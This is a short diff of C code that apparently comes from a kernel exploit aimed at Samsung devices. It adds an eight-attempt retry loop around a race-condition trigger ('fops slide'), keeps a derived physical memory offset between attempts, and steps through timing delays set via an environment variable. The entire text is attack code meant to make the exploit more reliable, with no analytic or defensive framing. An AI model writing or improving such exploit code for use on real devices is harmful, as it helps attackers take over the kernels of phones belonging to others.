@@ -2387,12 +2387,36 @@ int app_trigger_fops_slide_route(void) {
           (unsigned int)slide_enter_delay_usec(),
           (unsigned long long)slide_route_fine_delay_ticks);
   app_publish_writer_started();
+
+  /* 8-shot fops retry with retained p0_offset (SamSU 1.68 approach).
+   * parent, target, lock, and the underlying p0 physical offset are NOT
+   * re-derived between attempts. Only the coarse delay is advanced. */
+  for (int fops_retry = 1; fops_retry <= 8; fops_retry++) {
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-  /* Preserve the immediate successful-trigger to CFI handoff. */
-  return slide_trigger_physical_state_report(0);
+    int ok = slide_trigger_physical_state_report(0);
 #else
-  return slide_trigger_physical_state();
+    int ok = slide_trigger_physical_state();
 #endif
+    if (ok) {
+      pr_info("app fops slide succeeded retry=%d/8\n", fops_retry);
+      return 1;
+    }
+    pr_warning("app fops slide retry=%d/8 failed\n", fops_retry);
+
+    if (fops_retry < 8) {
+      int next_delay =
+          delays[delay_index % (sizeof(delays) / sizeof(delays[0]))];
+      delay_index++;
+      snprintf(delay_arg, sizeof(delay_arg), "%d", next_delay);
+      SYSCHK(setenv("SLIDE_ENTER_DELAY_USEC", delay_arg, 1));
+      slide_route_fine_delay_ticks = slide_select_route_fine_delay_ticks();
+      if (slide_route_fine_delay_ticks == UINT64_MAX) {
+        return 0;
+      }
+      usleep(10000);
+    }
+  }
+  return 0;
 }
 #endif
 
